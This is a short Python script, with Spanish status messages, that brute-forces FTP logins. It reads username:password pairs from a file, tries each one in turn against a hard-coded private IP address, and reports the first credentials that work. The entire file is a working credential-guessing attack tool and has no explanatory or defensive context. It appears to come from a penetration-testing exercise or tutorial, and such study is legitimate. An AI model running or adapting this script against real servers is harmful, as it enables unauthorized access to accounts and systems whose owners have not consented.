import ftplib
import time


def brute_login(hostname, passwd_file):
    with open(passwd_file) as file:
        ftp = ftplib.FTP(hostname)
        for line in file.readlines():
            time.sleep(1)
            username = line.split(':')[0]
            password = line.split(':')[1].strip('\r').strip('\n')

            print(f'[+] Probando: {username}/{password}')

            try:
                ftp.login(username, password)
                print(f'\n[*] {str(hostname)} FTP Login Exitoso: '
                      f'{username}/{password}')
                ftp.quit()
                return username, password
            except Exception as e:
                print(f'[-] Excepcion: {e}')
                pass

        print('\n[-] No se pudieron encontrar credenciales FTP.')
        return None, None


if __name__ == "__main__":
    tgt_host = '192.168.95.179'
    pass_file = 'userpass.txt'
    brute_login(tgt_host, pass_file)
